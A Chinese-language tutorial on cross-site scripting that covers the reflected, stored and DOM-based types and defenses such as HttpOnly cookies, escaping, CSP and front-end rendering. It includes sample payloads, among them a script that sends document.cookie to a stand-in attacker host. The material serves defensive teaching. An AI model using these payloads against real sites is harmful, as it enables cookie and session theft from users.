https://tech.meituan.com/2018/09/27/fe-security.html

# XSS（Cross Site Scripting）
XSS攻击全称跨站脚本攻击，是为了区别于层叠样式表CSS所以使用XSS作为缩写

使用cookie，localStorage，sessionStorage时要注意是否有代码存在XSS注入的风险

## XSS注入的方法
- 在 HTML 中内嵌的文本中，恶意内容以 script 标签形成注入。
- 在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。
- 在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。
- 在标签的 href、src 等属性中，包含 javascript: 等可执行代码。
- 在 onload、onerror、onclick 等事件中，注入不受控制代码。
- 在 style 属性和标签中，包含类似 background-image:url("javascript:..."); 的代码（新版本浏览器已经可以防范）。
- 在 style 属性和标签中，包含类似 expression(...) 的 CSS 表达式代码（新版本浏览器已经可以防范）。

## 攻击类型
### 一、 反射型  
是指发生请求时，XSS代码出现在**请求URL**中，作为参数提交到服务器，服务器解析并响应。响应结果中包含XSS代码，最后浏览器解析并执行。  
举个例子
```javascript
`${url}?name=<script>alert(111)</script>`
```

攻击步骤
1. 攻击者构造出**特殊的 URL**，其中包含恶意代码。
2. 用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。
3. 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。
4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

反射型 XSS 跟存储型 XSS 的区别是：存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。

反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。

举个例子，当我们在test.html中有一个搜索的url，test.html?q=xxx，这里的xxx就是搜索的内容，而我们在自己的攻击网站hacker.html中，添加一个跳转
```html
<a href="test.html?q=<script src='hacker.js'></script>"></a>
```
那么用户在点击这个链接时，就等于在搜索框输入了
```html
<script src='hacker.js'></script>
```
此时，就会加载了我之前准备好的攻击文件，hacker.js
```javascript
var img = new Image();
img.src = "http://hacker.html?q="+document.cookie;
document.body.append(img);
```
这样子，就会将用户的cookie发送到我的服务端，就会造成cookie被我知道了

### 二、 存储型  
存储型XSS，也叫持久型XSS，主要是将XSS代码发送到服务器（不管是数据库、内存还是文件系统等。），然后在下次请求页面的时候就不用带上XSS代码了。最典型的就是留言板XSS。用户提交了一条包含XSS代码的留言到数据库。当目标用户查询留言时，那些留言的内容会从服务器解析之后加载出来。浏览器发现XSS代码时并不会加以判断，直接当做正常的HTML和JS解析执行，此时XSS攻击就发生了。  
比如在某个页面上有留言版，我们在留言上写上这样的内容
```html
<script>alert(1111)</script>
```
在下次用户打开页面的时候，就会先弹出1111（如果没有对该攻击做出防御的话）

攻击步骤
1. 攻击者将恶意代码提交到目标网站的**数据库**中。
2. 用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。
3. 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。
4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

### 三、DOM 型 XSS
攻击步骤
1. 攻击者构造出特殊的 URL，其中包含恶意代码。
2. 用户打开带有恶意代码的 URL。
3. 用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。
4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。

## 防止被攻击的手段
1. 使用cookie的httponly属性，防止通过document.cookie获取cookie

2. 在服务器对内容进行过滤  
识别标签进行替换，将<替换成&lt;

3. 使用CSP  
实施严格的CSP可以有效地防范XSS攻击，具体来讲CSP有如下几个功能：

* 限制加载其他域下的资源文件，这样即使黑客插入了一个JavaScript文件，这个JavaScript文件也是无法被加载的；
* 禁止向第三方域提交数据，这样用户数据也不会外泄；
* 禁止执行内联脚本和未授权的脚本；
* 还提供了上报机制，这样可以帮助我们尽快发现有哪些XSS攻击，以便尽快修复问题。

因此，利用好CSP能够有效降低XSS攻击的概率。

4. 纯前端渲染  
使用第2种方法会带来很多问题，如果在前端做处理的话，那么攻击者可能会绕过前端直接发起请求，而如果在后端存储时做处理，对应前端不同地方的处理不同，可能会造成渲染出现问题的情况

纯前端渲染：
- 浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。
然后浏览器执行 HTML 中的 JavaScript。
- JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。
- 在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（.innerText），还是属性（.setAttribute），还是样式（.style）等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。

但纯前端渲染还需注意避免 DOM 型 XSS 漏洞（例如 onload 事件和 href 中的 javascript:xxx 等）。

在很多内部、管理系统中，采用纯前端渲染是非常合适的。但对于性能要求高，或有 SEO 需求的页面，我们仍然要面对拼接 HTML 的问题。
